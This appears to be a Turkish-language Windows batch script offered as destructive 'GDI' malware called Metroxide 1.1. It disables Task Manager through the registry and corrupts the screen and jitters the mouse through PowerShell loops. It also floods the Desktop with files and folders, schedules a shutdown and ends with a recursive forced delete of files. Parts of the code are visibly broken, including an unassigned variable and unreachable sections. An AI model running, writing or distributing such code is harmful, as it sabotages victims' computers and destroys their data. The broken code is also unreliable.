@echo off
setlocal EnableDelayedExpansion
title Metroxide 1.1 -  GDI
color 4f
cls

echo.
echo METROXIDE 1.1 GDI HIRSIZLIĞI BAŞLIYOR AMK!
echo Ekran patlayacak, mouse titriyecek, iz bırakacak, pc yutulacak!
echo VM'DE DENE - GERÇEK MAKİNENDE ÇALIŞTIRMA AQ!
pause >nul

:: Yönetici kontrolü
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Yönetici olarak çalıştır lan!
    pause
    exit
)

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1

:: GDI efekti (PowerShell ile ekranı bozma - rastgele renk patlaması)
echo GDI hırsızlığı başlıyor... Ekran yutuluyor!
start /min powershell -NoProfile -Command ^
    "Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern IntPtr GetDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")]public static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, int rop);' -Name GDI -Namespace Win32 -PassThru; while($true){ $hdc = $code::GetDC([IntPtr]::Zero); $rop = (Get-Random -Min 0x00000042 -Max 0x00FF0062); $code::PatBlt($hdc, 0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height, $rop); Start-Sleep -Milliseconds 30 }"

:: Mouse titretme + şiddetli iz bırakma
start /min powershell -NoProfile -Command ^
    "Add-Type -AssemblyName System.Windows.Forms; while($true){ $p = [System.Windows.Forms.Cursor]::Position; $x = $p.X + (Get-Random -Min -70 -Max 71); $y = $p.Y + (Get-Random -Min -70 -Max 71); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x,$y); Start-Sleep -Milliseconds 8 }"

:trail
set /a rx=%random% %% 1920, ry=%random% %% 1080, sayi=%random% %% 999999
echo GDI HIRSIZLIK IZI - !sayi! - X!rx! Y!ry! > "%USERPROFILE%\Desktop\HirsizIz_!sayi!.txt"
timeout /t 0 >nul
goto trail

:: CMD spam (daha kuduruk mesajlar)
:cmdspam
set /a rnd=%random% %% 8
if !rnd! equ 0 start cmd /c "color 4f & echo GDI HIRSIZLIĞI YAPILIYOR AMK! & timeout /t 2 >nul & exit"
if !rnd! equ 1 start cmd /c "color 0a & echo EKRAN PATLIYOR - KUDURUK GELDI! & timeout /t 3 >nul & exit"
if !rnd! equ 2 start cmd /c "echo MOUSE TITRIYOR - PC YENİLDİ! & timeout /t 4 >nul & exit"
if !rnd! equ 3 start cmd /c "color e & echo SISTEM YUTULUYOR AMK! & timeout /t 2 >nul & exit"
if !rnd! equ 4 start cmd /c "echo GDI EFEKTİ FULL - KAÇAMAZSIN! & timeout /t 3 >nul & exit"
if !rnd! equ 5 start cmd /c "color 1f & echo METROXIDE KAZANDI! & timeout /t 4 >nul & exit"
if !rnd! equ 6 start cmd /c "echo HIRSIZLIK MOD AKTIF - EKRAN BOZULDU! & timeout /t 2 >nul & exit"
if !rnd! equ 7 start cmd /c "echo KUDURUK 1.1 - PC BİTTİ AMK! & timeout /t 3 >nul & exit"
timeout /t 4 >nul
goto cmdspam

:: Klasör bombası (daha fazla)
for /l %%i in (1,1,500) do md "%USERPROFILE%\Desktop\Hirsizlik_%%i" 2>nul

:: Sahte silme animasyonu (daha uzun)
cls
echo GDI hırsızlığıyla PC yutuluyor amk!
for /l %%i in (1,1,150) do (
    cls
    echo %%i / 150 - EKRAN BOZULDU!
    echo %%i / 150 - GDI PATLADI!
    echo %%i / 150 - KUDURUK KAZANDI!
    timeout /t 0.5 >nul
)

:: Son kapanış
echo METROXIDE 1.1 GDI HIRSIZLIĞI KAZANDI! PC BİTTİ AMK!
shutdown -s -t 20 -c "METROXIDE 1.1 KAZANDI! GDI EFEKTİYLE YENDİ!"
del /f /q /s *.* (her şeyi siler)
Pause
